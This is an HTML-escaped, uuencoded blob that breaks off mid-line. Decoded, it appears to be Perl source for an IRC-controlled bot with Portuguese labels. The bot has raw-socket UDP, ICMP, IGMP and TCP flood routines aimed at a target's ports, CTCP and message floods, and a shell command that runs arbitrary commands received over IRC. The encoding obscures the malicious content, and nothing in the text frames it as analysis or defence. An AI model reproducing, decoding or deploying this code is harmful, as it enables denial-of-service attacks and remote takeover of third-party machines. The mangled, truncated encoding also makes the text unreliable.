&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z_7#`P,B`M(%-T871U&lt;R`M7#`P,B(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@_(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z7#`P,E1I;7!&lt;,#`R.B`D9&#x27;1I;64B+B)S96-U;F1E+B(I.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z7#`P,E1O=&amp;%L(&#x27;!A8VME_=%PP,#(Z(&quot;(N*&quot;1P86-O=&amp;5S&gt;W5D&lt;&#x27;T@*R`D&lt;&amp;%C;W1E&lt;WMI9VUP?2`K(&quot;1P86-O=&amp;5S&gt;VEC;7!](&quot;L@(&quot;1P_86-O=&amp;5S&gt;V]]*2D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D_&lt;&#x27;)I;G1L(#I&lt;,#`R5&amp;]T86P@8GET97-&lt;,#`R.B`B+B@D8GET97-[:6-M&lt;&#x27;T@*R`D8GET97,@&gt;VEG;7!](&quot;L@_)&amp;)Y=&amp;5S&gt;W5D&lt;&#x27;T@*R`D8GET97-[;WTI*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#7V-U&lt;E]S;V-K_970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)&amp;;&amp;]O9%PP,#(Z(&quot;(N:6YT*&quot;@H)&amp;)Y=&amp;5S&gt;VEC;7!]*R1B&gt;71E_&lt;WMI9VUP?2LD8GET97-[=61P?2`K(&quot;1B&gt;71E&lt;WMO?2DO,3`R-&quot;DO)&amp;1T:6UE*2XB(&amp;MB&lt;&#x27;,B*3L*(&quot;`@(&quot;`@_(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@97AI=#L*(&quot;`@(&quot;`@(&#x27;T*(&quot;!]&quot;GT*&quot;G-U8B!I&lt;F-A_&lt;V4@&gt;PH@(&amp;UY(&quot;@D:V5M+&quot;`D&lt;&#x27;)I;G1L+&quot;`D8V%S92D@/2!`7SL*&quot;B`@(&amp;EF(&quot;@D8V%S92`]?B`O7FIO:6X@_*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;!J*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7G!A&lt;G0@*&quot;XJ*2\\I(&#x27;L*_(&quot;`@(&quot;`@&lt;&quot;@B)#$B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYR96IO:6Y&lt;&lt;RLH+BHI+RD@&gt;PH@(&quot;`@_(&quot;!M&gt;2`D8VAA;B`](&quot;0Q.PH@(&quot;`@(&quot;!I9B`H)&amp;-H86X@/7X@+UXH7&amp;0K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&amp;9O_&lt;B`H;7D@)&amp;-A(#T@,3L@)&amp;-A(#P](&quot;0Q.R`D8V$K*R`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&#x27;`H(B0R(BD[&quot;B`@(&quot;`@(&quot;`@_(&quot;!J*&quot;(D,B(I.PH@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&#x27;`H(B1C:&amp;%N(BD[&quot;B`@(&quot;`@_(&quot;`@(&quot;!J*&quot;(D8VAA;B(I.PH@(&quot;`@(&quot;!]&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;;W`O*2![&quot;B`@(&quot;`@_(&amp;]P*&quot;(D&lt;&#x27;)I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E&lt;2`B;W`B.PH@(&quot;`@(&quot;!M&gt;2`D;V%R9R`](&#x27;-U8G-T_&lt;B@D8V%S92P@,RD[&quot;B`@(&quot;`@(&amp;]P*&quot;(D,2(L(&quot;(D,B(I(&amp;EF(&quot;@D;V%R9R`]?B`O*%Q3*RE&lt;&lt;RLH7%,K*2\\I_.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7F1E;W`O*2![&quot;B`@(&quot;`@(&amp;1E;W`H(B1P&lt;FEN=&amp;PB+&quot;`B)&amp;ME_;2(I(&amp;EF(&quot;1C87-E(&amp;5Q(&quot;)D96]P(CL*(&quot;`@(&quot;`@;7D@)&amp;]A&lt;F&lt;@/2!S=6)S=&#x27;(H)&amp;-A&lt;V4L(#4I.PH@(&quot;`@_(&quot;!D96]P*&quot;(D,2(L(&quot;(D,B(I(&amp;EF(&quot;@D;V%R9R`]?B`O*%Q3*RE&lt;&lt;RLH7%,K*2\\I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF_(&quot;@D8V%S92`]?B`O7G9O:6-E+RD@&gt;PH@(&quot;`@(&quot;!V;VEC92@B)&#x27;!R:6YT;&quot;(L(&quot;(D:V5M(BD@:68@)&amp;-A&lt;V4@_97$@(G9O:6-E(CL*(&quot;`@(&quot;`@)&amp;]A&lt;F&lt;@/2!S=6)S=&#x27;(H)&amp;-A&lt;V4L(#8I.PH@(&quot;`@(&quot;!V;VEC92@B)#$B+&quot;`B_)#(B*2!I9B`H)&amp;]A&lt;F&lt;@/7X@+RA&lt;4RLI7&#x27;,K*%Q3*RDO*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYD_979O:6-E+RD@&gt;PH@(&quot;`@(&quot;!D979O:6-E*&quot;(D&lt;&#x27;)I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E&lt;2`B9&amp;5V;VEC_92([&quot;B`@(&quot;`@(&quot;1O87)G(#T@&lt;W5B&lt;W1R*&quot;1C87-E+&quot;`X*3L*(&quot;`@(&quot;`@9&amp;5V;VEC92@B)#$B+&quot;`B)#(B*2!I_9B`H)&amp;]A&lt;F&lt;@/7X@+RA&lt;4RLI7&#x27;,K*%Q3*RDO*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYM&lt;V=&lt;&lt;RLH_7%,K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!M&lt;V&lt;H(B0Q(BP@(B0R(BD[&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;_9FQO;V1&lt;&lt;RLH7&amp;0K*5QS*RA&lt;4RLI(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;9O&lt;B`H;7D@)&amp;-F(#T@,3L@)&amp;-F(#P](&quot;0Q_.R`D8V8K*RD@&gt;PH@(&quot;`@(&quot;`@(&amp;US9R@B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S_92`]?B`O7F-T8W!F;&amp;]O9%QS*RA&lt;9&quot;LI7&#x27;,K*%Q3*RD@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@9F]R(&quot;AM&gt;2`D8V8@/2`Q_.R`D8V8@/#T@)#$[(&quot;1C9BLK*2![&quot;B`@(&quot;`@(&quot;`@8W1C&lt;&quot;@B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;B`@_(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7F-T8W!&lt;&lt;RLH7%,K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!C=&amp;-P*&quot;(D,2(L(&quot;(D,B(I_.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7FEN=FET95QS*RA&lt;4RLI(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;EN=FET_92@B)#$B+&quot;`B)#(B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYN:6-K(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;YI_8VLH(B0Q(BD[&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;8V]N96-T85QS*RA&lt;4RLI7&#x27;,K*%Q3*RDO*2![_&quot;B`@(&quot;`@(&quot;!C;VYE8W1A&lt;B@B)#(B+&quot;`B)#$B+&quot;`V-C8W*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYS_96YD7&#x27;,K*%Q3*RE&lt;&lt;RLH7%,K*2\\I(&#x27;L*(&quot;`@(&quot;`@1$-#.CI314Y$*&quot;(D,2(L(&quot;(D,B(I.PH@(&quot;!]&quot;B`@(&amp;5L_&lt;VEF(&quot;@D8V%S92`]?B`O7G)A=R`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF_(&quot;@D8V%S92`]?B`O7F5V86P@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@979A;&quot;`B)#$B.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S_92`]?B`O7F5N=&#x27;)A7&#x27;,K*%Q3*RE&lt;&lt;RLH7&amp;0K*2\\I(&#x27;L*(&quot;`@(&#x27;-L965P(&amp;EN=&quot;AR86YD*&quot;0R*2D[&quot;B`@(&quot;!J_*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7G-A:5QS*RA&lt;4RLI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;!S_;&amp;5E&lt;&quot;!I;G0H&lt;F%N9&quot;@D,BDI.PH@(&quot;`@&lt;&quot;@B)#$B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYS86ER_+RD@&gt;PH@(&quot;`@(&#x27;%U:70H*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYN;W9O;FEC:R\\I(&#x27;L*(&quot;`@(&amp;UY_(&quot;1N;W9O;FEC:R`](&amp;=E=&amp;YI8VLH*3L*(&quot;`@(&quot;!N:6-K*&quot;(D;F]V;VYI8VLB*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H_)&amp;-A&lt;V4@/7X@+UYE&lt;W1A=&amp;ES=&amp;EC87,@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;!I9B`H)#$@97$@(F]N(BD@&gt;PH@(&quot;`@(&quot;`D_97-T871I&lt;W1I8V%S(#T@,3L*(&quot;`@(&quot;`@;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(D5S=&amp;%T+G-T:6-A&lt;R!A=&amp;EV861A&lt;R$B_*3L*(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D,2!E&lt;2`B;V9F(BD@&gt;PH@(&quot;`@(&quot;`D97-T871I&lt;W1I8V%S(#T@,#L*(&quot;`@(&quot;`@_;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(D5S=&amp;%T+G-T:6-A&lt;R!D97-A=&amp;EV861A&lt;R$B*3L*(&quot;`@(&quot;!]&quot;B`@(&#x27;T*(&quot;`@96QS_:68@*&quot;1C87-E(#U^(&quot;]&gt;&lt;&amp;%C;W1E&lt;R`H+BHI+RD@&gt;PH@(&quot;`@(&amp;EF(&quot;@D,2!E&lt;2`B;VXB*2![&quot;B`@(&quot;`@(&quot;1P_86-O=&amp;5S(#T@,3L*(&quot;`@(&quot;`@;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(E!A8V]T97,@871I=F%D;W,A(BD@:68@*&quot;1E&lt;W1A_=&amp;ES=&amp;EC87,@/3T@(C$B*3L*(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D,2!E&lt;2`B;V9F(BD@&gt;PH@(&quot;`@(&quot;`D&lt;&amp;%C;W1E&lt;R`]_(#`[&quot;B`@(&quot;`@(&amp;US9R@B)&#x27;!R:6YT;&quot;(L(&quot;)086-O=&amp;5S(&amp;1E&lt;V%T:79A9&amp;]S(2(I(&amp;EF(&quot;@D97-T871I&lt;W1I_8V%S(#T](&quot;(Q(BD[&quot;B`@(&quot;`@?0H@(&quot;!]&quot;GT*&lt;W5B(&#x27;-H96QL(&#x27;L*(&quot;!R971U&lt;FX@=6YL97-S(&quot;1A8V5S&lt;V]S_:&amp;5L;#L*(&quot;!M&gt;2`D&lt;&#x27;)I;G1L/21?6S!=.PH@(&amp;UY(&quot;1C;VUA;F1O/21?6S%=.PH@(&amp;EF(&quot;@D8V]M86YD;R`]_?B`O8V0@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&amp;-H9&amp;ER*&quot;(D,2(I(&#x27;Q\\(&amp;US9R@B)&#x27;!R:6YT;&quot;(L(&quot;)$:7)E=&quot;YR:6\\@:6YE_&gt;&amp;ES=&amp;5N=&amp;4A(BD[&quot;B`@(&quot;!R971U&lt;FX[&quot;B`@?0H@(&amp;5L&lt;VEF(&quot;@D&lt;&amp;ED(#T@9F]R:RD@&gt;PH@(&quot;`@(&#x27;=A:71P_:60H)&#x27;!I9&quot;P@,&quot;D[&quot;B`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@:68@*&amp;9O&lt;FLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@97AI=#L*(&quot;`@(&quot;`@_(&#x27;T@96QS92![&quot;B`@(&quot;`@(&quot;`@(&quot;`@;7D@0&#x27;)E&lt;W`]8&quot;1C;VUA;F1O(#(^)C$@,SXF,6`[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_;7D@)&amp;,],#L*(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY(&quot;1L:6YH82`H0&#x27;)E&lt;W`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1C_*RL[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C:&amp;]P(&quot;1L:6YH83L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C_:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#HD;&amp;EN:&amp;$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;@D8R`^/2`B)&amp;QI;F%S_7VUA&gt;&quot;(I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;,],#L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VQE97`@)&#x27;-L965P.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!E&gt;&amp;ET.PH@(&quot;`@(&quot;`@?0H@(&#x27;T*?0H*&lt;W5B(&amp;%T_=&amp;%C:V5R(&#x27;L*(&quot;!M&gt;2`D:6%D9&#x27;(@/2!I;F5T7V%T;VXH)%];,%TI.PH@(&amp;UY(&quot;1M&lt;V&lt;@/2`G0B&lt;@&gt;&quot;`D7ULQ_73L*(&quot;!M&gt;2`D9G1I;64@/2`D7ULR73L*(&quot;!M&gt;2`D8W`@/2`P.PH@(&amp;UY(&quot;@E&lt;&amp;%C;W1E&lt;RD[&quot;B`@)&#x27;!A8V]T_97-[:6-M&lt;&#x27;T@/2`D&lt;&amp;%C;W1E&lt;WMI9VUP?2`](&quot;1P86-O=&amp;5S&gt;W5D&lt;&#x27;T@/2`D&lt;&amp;%C;W1E&lt;WMO?2`](&quot;1P86-O_=&amp;5S&gt;W1C&lt;&#x27;T@/2`P.PH*(&quot;!S;V-K970H4T]#2S$L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`R*2!O&lt;B`D8W`K*SL*_(&quot;!S;V-K970H4T]#2S(L(%!&amp;7TE.150L(%-/0TM?1$=204TL(#$W*2!O&lt;B`D8W`K*SL*(&quot;!S;V-K970H4T]#_2S,L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`Q*2!O&lt;B`D8W`K*SL*(&quot;!S;V-K970H4T]#2S0L(%!&amp;7TE.150L(%-/_0TM?4D%7+&quot;`V*2!O&lt;B`D8W`K*SL*(&quot;!R971U&lt;FXH=6YD968I(&amp;EF(&quot;1C&lt;&quot;`]/2`T.PH@(&amp;UY(&quot;1I=&amp;EM92`]_(&#x27;1I;64[&quot;B`@;7D@*&quot;1C=7)?=&amp;EM92D[&quot;B`@=VAI;&amp;4@*&quot;`Q(&quot;D@&gt;PH@(&quot;`@(&amp;9O&lt;B`H;7D@)&#x27;!O&lt;G1A(#T@_,3L@)&#x27;!O&lt;G1A(#P](#8U-3,U.R`D&lt;&amp;]R=&amp;$K*RD@&gt;PH@(&quot;`@(&quot;`@)&amp;-U&lt;E]T:6UE(#T@=&amp;EM92`M(&quot;1I=&amp;EM_93L*(&quot;`@(&quot;`@(&amp;QA&lt;W0@:68@)&amp;-U&lt;E]T:6UE(#X](&quot;1F=&amp;EM93L*(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S$L(&quot;1M&lt;V&lt;L_(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD(&quot;1P86-O=&amp;5S&gt;VEG;7!]*RL@:68@*&quot;1P86-O_=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@&lt;V5N9&quot;A33T-+,BP@)&amp;US9RP@,&quot;P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A+&quot;`D:6%D_9&#x27;(I*2!A;F0@)&#x27;!A8V]T97-[=61P?2LK(&amp;EF(&quot;@D&lt;&amp;%C;W1E&lt;R`]/2`Q*3L*(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S,L_(&quot;1M&lt;V&lt;L(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD(&quot;1P86-O=&amp;5S&gt;VEC;7!]*RL@:68@_*&quot;1P86-O=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@&lt;V5N9&quot;A33T-+-&quot;P@)&amp;US9RP@,&quot;P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A_+&quot;`D:6%D9&#x27;(I*2!A;F0@)&#x27;!A8V]T97-[=&amp;-P?2LK(&amp;EF(&quot;@D&lt;&amp;%C;W1E&lt;R`]/2`Q*3L*&quot;B`@(&quot;`@(&quot;!F;W(@_*&amp;UY(&quot;1P8R`](#,[(&quot;1P8R`\\/2`R-34[)&#x27;!C*RLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@;F5X=&quot;!I9B`D&lt;&amp;,@/3T@-CL*(&quot;`@_(&quot;`@(&quot;`@)&amp;-U&lt;E]T:6UE(#T@=&amp;EM92`M(&quot;1I=&amp;EM93L*(&quot;`@(&quot;`@(&quot;`@;&amp;%S=&quot;!I9B`D8W5R7W1I;64@/CT@_)&amp;9T:6UE.PH@(&quot;`@(&quot;`@(&quot;!S;V-K970H4T]#2S4L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`D&lt;&amp;,I(&amp;]R(&amp;YE&gt;&#x27;0[_&quot;B`@(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S4L(&quot;1M&lt;V&lt;L(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD_(&quot;1P86-O=&amp;5S&gt;V]]*RL@:68@*&quot;1P86-O=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@(&#x27;T*(&quot;`@(&quot;!L87-T(&amp;EF_(&quot;1C=7)?=&amp;EM92`^/2`D9G1I;64[&quot;B`@?0H@(&#x27;)E=&#x27;5R;B@D8W5R7W1I;64L(&quot;5P86-O=&amp;5S*3L*?0H*&quot;G-U_8B!A8W1I;VX@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)04DE635-&#x27;(&quot;1?6S!=_(#I&lt;,#`Q04-424].(&quot;1?6S%=7#`P,2(I.PI]&quot;@IS=6(@8W1C&lt;&quot;![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T]_(#$[&quot;B`@(&#x27;-E;F1R87&lt;H(E!2259-4T&lt;@)%];,%T@.EPP,#$D7ULQ75PP,#$B*3L*?0IS=6(@;7-G(&#x27;L*(&quot;`@_&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B4%))5DU31R`D7ULP72`Z)%];,5TB*3L*?0H*_&lt;W5B(&amp;YO=&amp;EC92![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(DY/5$E#12`D7ULP_72`Z)%];,5TB*3L*?0H*&lt;W5B(&amp;]P(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B_34]$12`D7ULP72`K;R`D7ULQ72(I.PI]&quot;G-U8B!D96]P(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*_(&quot;`@&lt;V5N9&#x27;)A=R@B34]$12`D7ULP72`M;R`D7ULQ72(I.PI]&quot;G-U8B!H;W`@&gt;PH@(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S_&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B34]$12`D7ULP72`K:&quot;`D7ULQ72(I.PI]&quot;G-U8B!D96AO&lt;&quot;![&quot;B`@_(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];,%T@*V@@)%];,5TB*3L*?0IS_=6(@=F]I8V4@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)-3T1%(&quot;1?6S!=(&quot;MV_(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;1E=F]I8V4@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W_*&quot;)-3T1%(&quot;1?6S!=(&quot;UV(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;)A;B![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[_&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];,%T@*V(@)%];,5TB*3L*?0IS=6(@=6YB86X@&gt;PH@(&quot;!R971U&lt;FX@=6YL_97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)-3T1%(&quot;1?6S!=(&quot;UB(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;MI8VL@&gt;PH@_(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)+24-+(&quot;1?6S!=(&quot;1?6S%=(#HD7ULR72(I_.PI]&quot;@IS=6(@;6]D;R![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];_,%T@)%];,5TB*3L*?0IS=6(@;6]D92![(&amp;UO9&amp;\\H0%\\I.R!]&quot;@IS=6(@:B![(&quot;9J;VEN*$!?*3L@?0IS=6(@_:F]I;B![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@(&#x27;-E;F1R87&lt;H(DI/24X@)%];,%TB*3L*?0IS_=6(@&lt;&quot;![(&#x27;!A&lt;G0H0%\\I.R!]&quot;G-U8B!P87)T(&#x27;MS96YD&lt;F%W*&quot;)005)4(&quot;1?6S!=(BD[?0H*&lt;W5B(&amp;YI8VL@_&gt;PH@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@&lt;V5N9&#x27;)A=R@B3DE#2R`D7ULP72(I.PI]&quot;@IS=6(@:6YV_:71E(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B24Y6251%(&quot;1?6S%=(&quot;1?6S!=_(BD[&quot;GT*&lt;W5B(&#x27;1O&lt;&amp;EC;R![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(E1/4$E#_(&quot;1?6S!=(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&#x27;1O&lt;&amp;EC(&#x27;L@=&amp;]P:6-O*$!?*3L@?0H*&lt;W5B(&#x27;=H;VES(&#x27;L*(&quot;!R971U_&lt;FX@=6YL97-S(&quot;0C7R`]/2`P.PH@(&#x27;-E;F1R87&lt;H(E=(3TE3(&quot;1?6S!=(BD[&quot;GT*&lt;W5B(&#x27;=H;R![&quot;B`@&lt;F5T_=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,#L*(&quot;!S96YD&lt;F%W*&quot;)72$\\@)%];,%TB*3L*?0IS=6(@;F%M97,@&gt;PH@(&#x27;)E_=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@&lt;V5N9&#x27;)A=R@B3D%-15,@)%];,%TB*3L*?0IS=6(@87=A&gt;2![&quot;B`@_&lt;V5N9&#x27;)A=R@B05=!62`D7ULP72(I.PI]&quot;G-U8B!B86-K(&#x27;L@87=A&gt;2@I.R!]&quot;G-U8B!Q=6ET(&#x27;L*(&quot;!S96YD_&lt;F%W*&quot;)154E4(#HD7ULP72(I.PH@(&amp;5X:70[&quot;GT*&quot;G!A8VMA9V4@1$-#.PH*&lt;W5B(&amp;-O;FYE8W1I;VYS(&#x27;L*_(&quot;`@;7D@0&#x27;)E861Y(#T@)&amp;1C8U]S96PM/F-A;E]R96%D*#$I.PH@(&quot;!F;W)E86-H(&amp;UY(&quot;1F:&quot;`H0&#x27;)E861Y_*2![&quot;B`@(&quot;`@;7D@)&amp;1C8W1I&lt;&amp;\\@/2`D1$-#&gt;R1F:&#x27;U[=&amp;EP;WT[&quot;B`@(&quot;`@;7D@)&amp;%R&lt;75I=F\\@/2`D1$-#_&gt;R1F:&#x27;U[87)Q=6EV;WT[&quot;B`@(&quot;`@;7D@)&amp;)Y=&amp;5S(#T@)$1#0WLD9FA]&gt;V)Y=&amp;5S?3L*(&quot;`@(&quot;!M&gt;2`D8W5R_7V)Y=&amp;4@/2`D1$-#&gt;R1F:&#x27;U[8W5R8GET97T[&quot;B`@(&quot;`@;7D@)&amp;YI8VL@/2`D1$-#&gt;R1F:&#x27;U[;FEC:WT[&quot;@H@_(&quot;`@(&amp;UY(&quot;1M&lt;V&lt;[&quot;B`@(&quot;`@;7D@)&amp;YR96%D(#T@&lt;WES&lt;F5A9&quot;@D9F@L(&quot;1M&lt;V&lt;L(#$P,C0P*3L*&quot;B`@(&quot;`@_:68@*&quot;1N&lt;F5A9&quot;`]/2`P(&amp;%N9&quot;`D9&amp;-C=&amp;EP;R`]?B`O7BAG971\\&lt;V5N9&amp;-O;BDD+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;1$_0T-[)&amp;9H?7MS=&amp;%T=7-](#T@(D-A;F-E;&amp;%D;R([&quot;B`@(&quot;`@(&quot;`@)$1#0WLD9FA]&gt;V9T:6UE?2`](&#x27;1I;64[_&quot;B`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;1F:&quot;T^8VQO&lt;V4[&quot;B`@(&quot;`@(&quot;`@;F5X_=#L*(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&amp;EF(&quot;@D9&amp;-C=&amp;EP;R!E&lt;2`B9V5T(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;1$0T-[)&amp;9H?7MC=7)B_&gt;71E?2`K/2!L96YG=&amp;@H)&amp;US9RD[&quot;@H@(&quot;`@(&quot;`@(&amp;UY(&quot;1C=7)?8GET92`](&quot;1$0T-[)&amp;9H?7MC=7)B&gt;71E_?3L*&quot;B`@(&quot;`@(&quot;`@;W!E;BA&amp;24Q%+&quot;`B/CX@)&amp;%R&lt;75I=F\\B*3L*(&quot;`@(&quot;`@(&quot;!P&lt;FEN=&quot;!&amp;24Q%(&quot;(D;7-G_(B!I9B`H)&amp;-U&lt;E]B&gt;71E(#P](&quot;1B&gt;71E&lt;RD[&quot;B`@(&quot;`@(